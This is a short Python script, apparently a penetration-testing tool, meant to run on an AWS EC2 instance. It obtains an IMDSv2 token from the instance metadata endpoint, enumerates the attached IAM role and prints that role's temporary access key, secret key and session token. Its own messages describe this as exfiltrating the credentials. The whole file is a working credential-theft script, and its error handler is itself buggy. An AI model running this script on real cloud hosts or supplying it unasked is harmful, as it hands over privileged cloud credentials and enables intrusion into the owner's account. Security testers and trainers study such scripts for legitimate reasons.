import requests 
import json
#Made by Lizzie Moratti 
#This script is intended to be ran from an EC2 instance using Amazon Linux 2. It can be adapted for other purposes.
#By default (as of time of writing 11/25/2022), AL2 has python 2.7 supported and already has the requests library imported.
def requestsWrapper( url, headers,HTTPmethod='GET'):
    if(HTTPmethod == 'PUT'):
        response = requests.put(url, headers=headers).text
        return response
    response= requests.get(url, headers=headers).text
    return response
try:
    print("\n ********************************************************************** \n")
    print("Attempting to exfiltrate EC2 instance role credentials.")
    print("   Attempting to PUT request to metadata endpoint to obtain token for subsequent requests.")
    token = requestsWrapper('http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': '21600',},'PUT')
    print("        [SUCCESS]")
    print("   Enumerating role name for the EC2 instance profile.")
    ec2role = requestsWrapper('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {'X-aws-ec2-metadata-token': '%s' % token,})
    print("        [SUCCESS]")
    print("   Making final request for credentials")
    credentials = requestsWrapper('http://169.254.169.254/latest/meta-data/iam/security-credentials/%s/' % ec2role, {'X-aws-ec2-metadata-token': '%s' % token,})
    print("        [SUCCESS]")
    jsonCredentials = json.loads(credentials)
    print("These credentials expire after 6 hours.")
    print("\nAccess Key ID: " + jsonCredentials["AccessKeyId"])
    print("\nSecret Access Key: " + jsonCredentials["SecretAccessKey"])
    print("\nSecurity Token: " + jsonCredentials["Token"])
except Exception:
    print("Error: " + Exception.args)
    print("Something has gone wrong.")
